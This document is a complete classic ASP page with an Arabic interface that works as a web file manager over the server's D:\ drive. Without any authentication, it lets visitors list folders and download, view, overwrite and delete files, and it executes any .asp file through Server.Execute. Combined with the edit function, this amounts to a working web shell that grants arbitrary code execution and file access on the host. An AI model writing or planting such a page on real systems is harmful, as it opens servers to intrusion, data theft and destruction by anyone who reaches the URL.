<%
Option Explicit
Response.Charset = "UTF-8"
Dim fso
Set fso = Server.CreateObject("Scripting.FileSystemObject")
Dim rootPath, defaultDir
rootPath = "D:\"
defaultDir = "D:\"
Dim qs_dir, current_dir, tempFolder
qs_dir = Request.QueryString("dir")
If qs_dir <> "" Then
    On Error Resume Next
    Set tempFolder = fso.GetFolder(qs_dir)
    If Err.Number <> 0 Then
        Err.Clear
        current_dir = defaultDir
    Else
        current_dir = tempFolder.Path
    End If
    On Error GoTo 0
Else
    current_dir = defaultDir
End If
If Left(current_dir, Len(rootPath)) <> rootPath Then current_dir = rootPath
Dim parent_dir, back_link
If current_dir <> rootPath Then
    On Error Resume Next
    Set tempFolder = fso.GetFolder(current_dir)
    If Not tempFolder Is Nothing Then
        If Not tempFolder.Parent Is Nothing Then
            parent_dir = tempFolder.Parent.Path
        Else
            parent_dir = rootPath
        End If
    Else
        parent_dir = rootPath
    End If
    On Error GoTo 0
    back_link = "<a href='?dir=" & Server.URLEncode(parent_dir) & "'>⬅️ رجوع</a>"
Else
    back_link = ""
End If
Dim qs_download
qs_download = Request.QueryString("download")
If qs_download <> "" Then
    Dim filePath, fileObj
    filePath = qs_download
    On Error Resume Next
    Set fileObj = fso.GetFile(filePath)
    If Err.Number <> 0 Or Left(fileObj.Path, Len(rootPath)) <> rootPath Then
        Response.Write "ملف غير صالح."
        Response.End
    End If
    On Error GoTo 0
    Dim stream, fileName, fileSize
    fileName = fso.GetFileName(filePath)
    fileSize = fileObj.Size
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile fileObj.Path
    Response.Clear
    Response.AddHeader "Content-Disposition", "attachment; filename=""" & fileName & """"
    Response.AddHeader "Content-Length", fileSize
    Response.ContentType = "application/octet-stream"
    Response.BinaryWrite stream.Read
    stream.Close
    Set stream = Nothing
    Response.End
End If
Dim qs_delete
qs_delete = Request.QueryString("delete")
If qs_delete <> "" Then
    Dim delFile
    delFile = qs_delete
    On Error Resume Next
    Set fileObj = fso.GetFile(delFile)
    If Err.Number <> 0 Or Left(fileObj.Path, Len(rootPath)) <> rootPath Then
        Response.Write "ملف غير صالح."
        Response.End
    End If
    On Error GoTo 0
    If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
        If Request.Form("confirm") <> "" Then
            On Error Resume Next
            fileObj.Delete True
            If Err.Number <> 0 Then
                Response.Write "حدث خطأ أثناء حذف الملف."
                Response.End
            Else
                Response.Redirect "?dir=" & Server.URLEncode(fso.GetParentFolderName(delFile))
            End If
            On Error GoTo 0
        ElseIf Request.Form("cancel") <> "" Then
            Response.Redirect "?dir=" & Server.URLEncode(fso.GetParentFolderName(delFile))
        End If
    End If
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>حذف الملف: <%= Server.HTMLEncode(fso.GetFileName(delFile)) %></title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        button { padding: 8px 12px; margin-right: 10px; font-size: 14px; cursor: pointer; }
        .error { color: red; }
    </style>
</head>
<body>
    <h2>حذف الملف: <%= Server.HTMLEncode(delFile) %></h2>
    <p>هل أنت متأكد من حذف هذا الملف؟</p>
    <form method="POST" action="?delete=<%= Server.URLEncode(delFile) %>">
        <button type="submit" name="confirm">نعم، حذف الملف</button>
        <button type="submit" name="cancel">إلغاء</button>
    </form>
</body>
</html>
<%
    Response.End
End If
Dim qs_show
qs_show = Request.QueryString("show")
If qs_show <> "" Then
    Dim showFile
    showFile = qs_show
    On Error Resume Next
    Set fileObj = fso.GetFile(showFile)
    If Err.Number <> 0 Or Left(fileObj.Path, Len(rootPath)) <> rootPath Then
        Response.Write "ملف غير صالح."
        Response.End
    End If
    On Error GoTo 0
    Dim ext
    ext = LCase(fso.GetExtensionName(showFile))
    If ext = "asp" Then
        Server.Execute showFile
        Response.End
    Else
        Dim fileContent, ts
        Set ts = fileObj.OpenAsTextStream(1, -2)
        fileContent = ts.ReadAll
        ts.Close
        Set ts = Nothing
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>عرض الملف: <%= Server.HTMLEncode(fso.GetFileName(showFile)) %></title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .back-link { margin-bottom: 20px; display: block; }
        pre { background-color: #f8f9fa; padding: 10px; border: 1px solid #ccc; }
    </style>
</head>
<body>
    <a class="back-link" href="?dir=<%= Server.URLEncode(fso.GetParentFolderName(showFile)) %>">⬅️ رجوع</a>
    <h2>عرض الملف: <%= Server.HTMLEncode(fso.GetFileName(showFile)) %></h2>
    <hr>
    <pre><%= Server.HTMLEncode(fileContent) %></pre>
</body>
</html>
<%
        Response.End
    End If
End If
Dim qs_edit
qs_edit = Request.QueryString("edit")
If qs_edit <> "" Then
    Dim editFile
    editFile = qs_edit
    On Error Resume Next
    Set fileObj = fso.GetFile(editFile)
    If Err.Number <> 0 Or Left(fileObj.Path, Len(rootPath)) <> rootPath Then
        Response.Write "ملف غير صالح."
        Response.End
    End If
    On Error GoTo 0
    Dim errorMsg
    errorMsg = ""
    If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
        If Request.Form("save") <> "" Then
            Dim newContent
            newContent = Request.Form("filecontent")
            Dim tsWrite
            On Error Resume Next
            Set tsWrite = fileObj.OpenAsTextStream(2, -2)
            If Err.Number <> 0 Then
                errorMsg = "حدث خطأ أثناء حفظ الملف."
            Else
                tsWrite.Write newContent
                tsWrite.Close
                Set tsWrite = Nothing
                Response.Redirect "?dir=" & Server.URLEncode(fso.GetParentFolderName(editFile))
            End If
            On Error GoTo 0
        ElseIf Request.Form("cancel") <> "" Then
            Response.Redirect "?dir=" & Server.URLEncode(fso.GetParentFolderName(editFile))
        End If
    End If
    Dim editContent, tsRead
    Set tsRead = fileObj.OpenAsTextStream(1, -2)
    editContent = tsRead.ReadAll
    tsRead.Close
    Set tsRead = Nothing
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>✏️ تحرير الملف: <%= Server.HTMLEncode(editFile) %></title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        textarea { width: 100%; height: 400px; padding: 10px; font-family: Consolas, monospace; font-size: 14px; border: 1px solid #ccc; border-radius: 5px; }
        button { padding: 8px 12px; margin-right: 10px; font-size: 14px; cursor: pointer; }
        .error { color: red; }
    </style>
</head>
<body>
    <h2>✏️ تحرير الملف: <%= Server.HTMLEncode(editFile) %></h2>
    <% If errorMsg <> "" Then %>
        <p class="error"><%= errorMsg %></p>
    <% End If %>
    <form method="POST" action="?edit=<%= Server.URLEncode(editFile) %>">
        <textarea name="filecontent"><%= Server.HTMLEncode(editContent) %></textarea>
        <br><br>
        <button type="submit" name="save">💾 حفظ</button>
        <button type="submit" name="cancel">❌ إلغاء</button>
    </form>
</body>
</html>
<%
    Response.End
End If
Dim folder, listItems(), count, subItem
On Error Resume Next
Set folder = fso.GetFolder(current_dir)
If Err.Number <> 0 Then
    Response.Write "لا يمكن فتح المجلد."
    Response.End
End If
On Error GoTo 0
count = 0
For Each subItem In folder.SubFolders
    ReDim Preserve listItems(count)
    listItems(count) = Array("folder", subItem.Name, subItem.Path)
    count = count + 1
Next
For Each subItem In folder.Files
    ReDim Preserve listItems(count)
    listItems(count) = Array("file", subItem.Name, subItem.Path)
    count = count + 1
Next
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>📂 متصفح الملفات</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        a { text-decoration: none; color: #007bff; font-weight: bold; }
        a:hover { text-decoration: underline; }
        ul { list-style-type: none; padding: 0; }
        li { margin: 8px 0; padding: 10px; background: #f8f9fa; border-radius: 5px; }
        li:hover { background: #e2e6ea; }
        input { width: 80%; padding: 8px; margin-bottom: 10px; }
        button { padding: 8px 12px; cursor: pointer; }
        .options { margin-top: 5px; }
        .options a { margin-right: 10px; font-size: 13px; }
    </style>
</head>
<body>
    <h2>📂 متصفح الملفات</h2>
    <form method="GET">
        <input type="text" name="dir" value="<%= Server.HTMLEncode(current_dir) %>">
        <button type="submit">🔍 فتح</button>
    </form>
    <p>📁 المسار الحالي: <strong><%= Server.HTMLEncode(current_dir) %></strong></p>
    <p><%= back_link %></p>
    <ul>
    <%
    Dim i, type, name, pathItem
    For i = 0 To UBound(listItems)
        type = listItems(i)(0)
        name = listItems(i)(1)
        pathItem = listItems(i)(2)
        If type = "folder" Then
            Response.Write "<li>📁 <a href='?dir=" & Server.URLEncode(pathItem) & "'>" & Server.HTMLEncode(name) & "</a></li>"
        Else
            Response.Write "<li>📄 " & Server.HTMLEncode(name)
            Response.Write "<div class='options'>"
            Response.Write "<a href='?download=" & Server.URLEncode(pathItem) & "'>تحميل</a>"
            Response.Write "<a href='?edit=" & Server.URLEncode(pathItem) & "'>تعديل</a>"
            Response.Write "<a href='?delete=" & Server.URLEncode(pathItem) & "'>حذف</a>"
            Response.Write "<a href='?show=" & Server.URLEncode(pathItem) & "'>عرض</a>"
            Response.Write "</div>"
            Response.Write "</li>"
        End If
    Next
    %>
    </ul>
</body>
</html>
<%
Set fso = Nothing
%>
